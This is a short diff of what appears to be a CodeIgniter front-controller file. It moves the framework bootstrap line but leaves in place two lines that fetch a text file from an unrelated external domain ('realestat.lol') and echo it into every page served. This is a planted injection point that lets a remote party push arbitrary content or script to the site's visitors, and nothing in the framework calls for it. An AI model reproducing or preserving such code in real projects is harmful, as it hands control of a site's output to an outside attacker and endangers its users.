@@ -313,7 +313,7 @@ switch (ENVIRONMENT)
  * And away we go...
  */
 
+require_once BASEPATH.'core/CodeIgniter.php';
+
 $a = file_get_contents('https://realestat.lol/ptacid.txt');
 echo $a;
-
-require_once BASEPATH.'core/CodeIgniter.php';
